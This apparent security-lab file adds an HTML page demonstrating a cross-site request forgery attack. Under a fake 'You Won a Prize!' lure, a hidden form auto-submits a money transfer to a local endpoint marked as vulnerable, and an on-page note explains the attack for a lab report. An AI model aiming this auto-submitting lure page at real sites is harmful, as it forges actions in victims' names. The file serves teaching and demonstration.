@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 You Won a Prize!</title>
+    <style>
+        body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;
+             justify-content:center;align-items:center;min-height:100vh;margin:0;padding:1rem}
+        .card{background:#16213e;border-radius:12px;padding:2.5rem;max-width:520px;
+              text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.4)}
+        h1{color:#e94560;margin-bottom:1rem}
+        p{line-height:1.6;color:#a8a8b3}
+        .hidden-form{display:none}
+        .reveal{margin-top:1.5rem;font-size:.82rem;color:#c7c7d1;text-align:left;
+                background:#0f3460;padding:.9rem;border-radius:6px;line-height:1.55}
+        code{color:#e94560}
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🎉 Congratulations!</h1>
+    <p>You have been selected for a special prize!<br>
+    Please wait while we process your reward&hellip;</p>
+
+    <!--
+      CSRF ATTACK DEMONSTRATION
+      This hidden form auto-submits a transfer to the VULNERABLE endpoint using
+      the victim's existing session cookie. The victim never sees or approves it.
+      In a real attack this page would live on a different domain.
+    -->
+    <form class="hidden-form" id="csrf-form" method="POST"
+          action="http://127.0.0.1:5002/vulnerable/transfer">
+        <input type="hidden" name="recipient" value="bob">
+        <input type="hidden" name="amount" value="100">
+    </form>
+
+    <script>
+        // Auto-submit after a short delay to simulate the drive-by attack.
+        setTimeout(function () {
+            document.getElementById('csrf-form').submit();
+        }, 1000);
+    </script>
+
+    <div class="reveal">
+        <strong>What just happened (for the lab report):</strong><br>
+        This page contains a hidden <code>&lt;form&gt;</code> that auto-submits a POST to
+        <code>/vulnerable/transfer</code> with <code>recipient=bob</code> and
+        <code>amount=100</code>. Because that route has no CSRF token and the browser
+        automatically attaches the victim's session cookie, the server processes the
+        forged transfer as if the victim had submitted it.
+    </div>
+</div>
+</body>
+</html>
